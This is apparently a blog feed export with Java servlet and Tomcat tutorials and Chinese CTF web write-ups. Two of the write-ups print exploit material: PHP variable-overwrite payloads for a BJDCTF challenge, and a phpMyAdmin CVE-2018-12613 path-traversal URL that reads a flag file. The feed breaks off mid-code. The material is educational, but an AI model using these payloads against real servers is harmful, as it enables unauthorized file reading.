    <content type="html"><![CDATA[<h1 id="servlet相关"><a href="#servlet相关" class="headerlink" title="servlet相关"></a>servlet相关</h1><blockquote><p><a href="https://blog.csdn.net/qq_19782019/article/details/80292110">JavaWeb——Servlet（全网最详细教程包括Servlet源码分析）_刘扬俊的博客-CSDN博客_servlet</a></p></blockquote><h2 id="什么是servlet"><a href="#什么是servlet" class="headerlink" title="什么是servlet"></a>什么是servlet</h2><p>servlet是遵循Java Servlet规范的java类，是在web服务器端的符合<code>请求-响应</code>访问模式的应用程序。servlet可以接收来自web浏览器或其他HTTP客户端的请求，并将响应结果返回给客户端。</p><p>servlet通常用于在服务器端完成访问数据库、调用JavaBean等业务性操作。</p><p>狭义的Servlet是指Java语言实现的一个接口，广义的Servlet是指任何实现了这个Servlet接口的类。</p><p>Java Servlet是JSP技术的基础；大型的web应用程序的开发需要Java Servlet和JSP配合才能完成。</p><p>Servlet类的继承关系：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Object</span><br>    javax<span class="hljs-selector-class">.servlet</span><span class="hljs-selector-class">.GenericServlet</span><br>        javax<span class="hljs-selector-class">.servlet</span><span class="hljs-selector-class">.http</span><span class="hljs-selector-class">.HttpServlet</span><br>            org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span><span class="hljs-selector-class">.runtime</span>.HttpJspBase<br></code></pre></td></tr></table></figure><p>由JSP程序转换的Servlet都是HttpJspBase类的子类。</p><p><strong>servlet的工作模式</strong></p><ul><li>客户端发送请求至服务端；</li><li>服务器启动并调用Servlet，Servlet根据客户端请求生成响应内容并将其传给服务器；</li><li>服务器将响应返回客户端；</li></ul><p><strong>servlet的工作原理</strong></p><p>Servlet接口定义了Servlet与servlet容器之间的契约。这个契约是：Servlet容器将Servlet类载入内存，并产生Servlet实例和调用它具体的方法。但是要注意的是，在一个应用程序中，每种Servlet类型只能有一个实例。</p><p>用户请求致使Servlet容器调用Servlet的Service（）方法，并传入一个ServletRequest对象和一个ServletResponse对象。ServletRequest对象和ServletResponse对象都是由Servlet容器（例如TomCat）封装好的，并不需要程序员去实现，程序员可以直接使用这两个对象。</p><p> ServletRequest中封装了当前的Http请求，因此，开发人员不必解析和操作原始的Http数据。ServletResponse表示当前用户的Http响应，程序员只需直接操作ServletResponse对象就能把响应轻松的发回给用户。</p><p>对于每一个应用程序，Servlet容器还会创建一个ServletContext对象。这个对象中封装了上下文（应用程序）的环境详情。每个应用程序只有一个ServletContext。每个Servlet对象也都有一个封装Servlet配置的ServletConfig对象。</p><h2 id="servlet接口中定义的方法"><a href="#servlet接口中定义的方法" class="headerlink" title="servlet接口中定义的方法"></a>servlet接口中定义的方法</h2><p>servlet接口中定义的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Servlet</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig var1)</span> <span class="hljs-keyword">throws</span> ServletException;<br> <br>    ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span>;<br> <br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest var1, ServletResponse var2)</span> <span class="hljs-keyword">throws</span> ServletException, IOException;<br> <br>    String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span>;<br> <br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>servlet的声明周期</strong></p><p>其中，init( ),service( ),destroy( )是Servlet生命周期的方法。代表了Servlet从“出生”到“工作”再到“死亡 ”的过程。Servlet容器（例如TomCat）会根据下面的规则来调用这三个方法：</p><ul><li>init( ),当Servlet第一次被请求时，Servlet容器就会开始调用这个方法来初始化一个Servlet对象出来，但是这个方法在后续请求中不会在被Servlet容器调用，就像人只能“出生”一次一样。我们可以利用init（ ）方法来执行相应的初始化工作。调用这个方法时，Servlet容器会传入一个ServletConfig对象进来从而对Servlet对象进行初始化。</li><li>service( )方法，每当请求Servlet时，Servlet容器就会调用这个方法。就像人一样，需要不停的接受老板的指令并且“工作”。第一次请求时，Servlet容器会先调用init( )方法初始化一个Servlet对象出来，然后会调用它的service( )方法进行工作，但在后续的请求中，Servlet容器只会调用service方法了。</li><li>destory,当要销毁Servlet时，Servlet容器就会调用这个方法，就如人一样，到时期了就得死亡。在卸载应用程序或者关闭Servlet容器时，就会发生这种情况，一般在这个方法中会写一些清除代码。</li></ul><h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><p>在IDEA上使用servlet，网上找了很多方法都是没用的，所以就直接将<code>servlet-api.jar</code>作为外部包导入。</p><p>新建普通的java类，内容为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.wxyy;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-keyword">private</span> String message;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        message = <span class="hljs-string">&quot;今天是2023年1月1日&quot;</span>;<br>        System.out.println(<span class="hljs-string">&quot;&gt;&gt;&gt; 初始化servlet&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        response.setContentType(<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>);<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> response.getWriter();<br>        out.println(<span class="hljs-string">&quot;&lt;h1&gt;&quot;</span> + message + <span class="hljs-string">&quot;&lt;/h1&gt;&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destory</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;&gt;&gt;&gt; 销毁servlet&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后修改<code>web.xml</code>，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>HelloServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>org.wxyy.HelloServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>HelloServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/HelloServlet<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>启动tomcat，访问<code>/HelloServlet</code>目录，就等于直接访问了上面的类。</p><p>这里的编码方式有问题，中文显示乱码，这个还不知道怎么解决（<a href="https://blog.csdn.net/qq_44077455/article/details/109904774">IDEA中servlet输出语句输出乱码_Alstein的博客-CSDN博客_idea servlet乱码</a>）。</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>java-web</tag>
      
      <tag>servlet</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] BJDCTF2020-MarkLovesCat</title>
    <link href="/2022/12/31/%5Bctf-web%5D%20BJDCTF2020-MarkLovesCat/"/>
    <url>/2022/12/31/%5Bctf-web%5D%20BJDCTF2020-MarkLovesCat/</url>
    
    <content type="html"><![CDATA[<h1 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h1><p>进入是一个个人介绍的页面，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221231220245616.png" alt="image-20221231220245616"></p><p>所有的连接都是没用的，尝试目录爆破，扫出了<code>.git</code>，下载源码，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-variable">$yds</span> = <span class="hljs-string">&quot;dog&quot;</span>;<br><span class="hljs-variable">$is</span> = <span class="hljs-string">&quot;cat&quot;</span>;<br><span class="hljs-variable">$handsome</span> = <span class="hljs-string">&#x27;yds&#x27;</span>;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;　　　　<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$y</span>  ;  <span class="hljs-comment">//post 声明至当前文件</span><br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;　　　 <br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$$y</span>;  <span class="hljs-comment">//GET型变量重新赋值为当前文件变量中以其值为键名的值</span><br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;　 <span class="hljs-comment">//传入的变量为flag   value不是flag</span><br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;  <br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$yds</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;   <br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>);<br>&#125;<br><br><br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;the flag is: &quot;</span>.<span class="hljs-variable">$flag</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>主要有三个变量，看之后的判断，大概是利用变量覆盖。</p><p>在php中可以这样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;b&#x27;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;bb&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$$a</span>; <br><span class="hljs-comment">// 输出 bb   1.找到 $a,解析结果：b    2.找到$b,解析结果 bb</span><br></code></pre></td></tr></table></figure><p>首先看第一个循环，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;　　　　<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$y</span>  ;  <br>&#125;<br></code></pre></td></tr></table></figure><p>如果输入<code>yds=flag</code>，就可以将变量<code>yds</code>重新赋值了。</p><p>第二个循环，</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;　　　 <br>    <span class="hljs-variable">$</span><span class="hljs-variable">$x</span> = <span class="hljs-variable">$</span><span class="hljs-variable">$y</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><p>如果输入<code>?is=yds</code>，那么变量<code>is</code>就会等于<code>yds</code>了；</p><p>第三个循环，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;　 <br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果GET参数<code>flag</code>等于变量某个变量，且变量名不等于<code>flag</code>的话输出变量<code>handsome</code>；</p><p>第四个判断，</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span>(!isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;  <br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$yds</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>GET和POST不存在<code>flag</code>变量，输出变量<code>yds</code>；</p><p>第五个判断，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;   <br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>POST或GET的flag参数为<code>flag</code>，输出变量<code>is</code>；</p><p>一种解法，</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">yds</span>=flag<br></code></pre></td></tr></table></figure><p>在第二个循环中会将变量<code>$yds</code>变成<code>$flag</code>，然后在第四个判断中输出<code>$yds</code>，得到flag；</p><p>另一种解法，</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">?is=<span class="hljs-built_in">flag</span>&amp;<span class="hljs-built_in">flag</span>=<span class="hljs-built_in">flag</span><br></code></pre></td></tr></table></figure><p>首先在第二个循环中，将<code>$is</code>变成<code>$flag</code>，然后在第五个判断中输出<code>$is</code>，得到flag；</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[java] IDEA部署Tomcat</title>
    <link href="/2022/12/29/%5Bjava%5D%20IDEA%E9%83%A8%E7%BD%B2Tomcat/"/>
    <url>/2022/12/29/%5Bjava%5D%20IDEA%E9%83%A8%E7%BD%B2Tomcat/</url>
    
    <content type="html"><![CDATA[<h1 id="IDEA部署Tomcat"><a href="#IDEA部署Tomcat" class="headerlink" title="IDEA部署Tomcat"></a>IDEA部署Tomcat</h1><h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><p>创建一个普通的java项目，然后在项目名称上右键，选择<code>Add Framework Support</code></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221229211047276.png" alt="image-20221229211047276"></p><p>选择添加web应用<code>Web Application</code>，OK，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221229211204536.png" alt="image-20221229211204536"></p><p>现在目录中会出现这样的结构，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221229211355088.png" alt="image-20221229211355088"></p><h2 id="配置Tomcat"><a href="#配置Tomcat" class="headerlink" title="配置Tomcat"></a>配置Tomcat</h2><p>首先下载安装Tomcat，在IDEA中添加配置，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221229211611680.png" alt="image-20221229211611680"></p><p>添加配置，选择Tomcat，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221229211745668.png" alt="image-20221229211745668"></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221229211757491.png" alt="image-20221229211757491"></p><p>这样设置，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221229211925097.png" alt="image-20221229211925097"></p><p>然后点击<code>Deployment</code>，这里一开始没有东西，下面会有个错误提示，然后选择修复，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221229212022531.png" alt="image-20221229212022531"></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221229212045567.png" alt="image-20221229212045567"></p><p>下面的名字修改为<code>tomcat</code>，这里是会影响URL的，即一开始是<code>http://localhost:8080/</code>，添加这个之后变成<code>http://localhost:8080/tomcat</code>，保存退出。</p><p>启动服务器，等一会就跳出了页面。修改<code>index.jsp</code>的内容，刷新页面，内容改变，</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>  &lt;head&gt;<br>    &lt;title&gt;$Title$&lt;/title&gt;<br>  &lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;h1&gt;Hello World ^.^&lt;/h1&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221229212458051.png" alt="image-20221229212458051"></p><hr><p>如果IDEA的控制台是乱码，在设置中搜索<code>console</code>，设置编码方式为<code>UTF-8</code>，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221229212550323.png" alt="image-20221229212550323"></p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>tomcat</tag>
      
      <tag>java-web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] GWCTF2019-我有一个数据库</title>
    <link href="/2022/12/29/%5Bctf-web%5D%20GWCTF2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <url>/2022/12/29/%5Bctf-web%5D%20GWCTF2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<h1 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h1><p>进入是乱码，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221229193108913.png" alt="image-20221229193108913"></p><p>然后尝试解码，但是失败了；目录扫描，主要有三个文件<code>robots.txt</code>、<code>phpinfo.php</code>、<code>phpmyadmin</code>。</p><p>进入<code>phpmyadmin</code>，没什么东西，尝试读写文件，但是失败了，权限不对。[[渗透测试] SQL注入 - S1n9l3 (wxyy.one)](<a href="https://wxyy.one/2022/10/10/[%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95]">https://wxyy.one/2022/10/10/[渗透测试]</a> sql注入&#x2F;)</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221229193443007.png" alt="image-20221229193443007"></p><p>可以看到有很多有用的信息，能利用的是phpmyadmin的版本漏洞，</p><p><a href="https://www.jianshu.com/p/fb9c2ae16d09">cve-2018-12613-PhpMyadmin后台文件包含 - 简书 (jianshu.com)</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV+LmMK#rd">【首发】phpmyadmin4.8.1后台getshell (qq.com)</a></p><p>利用方式：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">32</span>a2418c-<span class="hljs-number">1017</span>-<span class="hljs-number">47</span>ac-<span class="hljs-number">9930</span>-<span class="hljs-number">7</span>e3dbd0913f7.node4.buuoj.cn:<span class="hljs-number">81</span><span class="hljs-regexp">/phpmyadmin/i</span>ndex.php?target=db_sql.php%<span class="hljs-number">253</span>f..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>flag<br></code></pre></td></tr></table></figure><p>直接读文件了。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] BJDCTF2020-ZJCTF不过如此</title>
    <link href="/2022/12/28/%5Bctf-web%5D%20BJDCTF2020-ZJCTF%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/"/>
    <url>/2022/12/28/%5Bctf-web%5D%20BJDCTF2020-ZJCTF%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h1><p>进入是一段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;I have a dream&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ 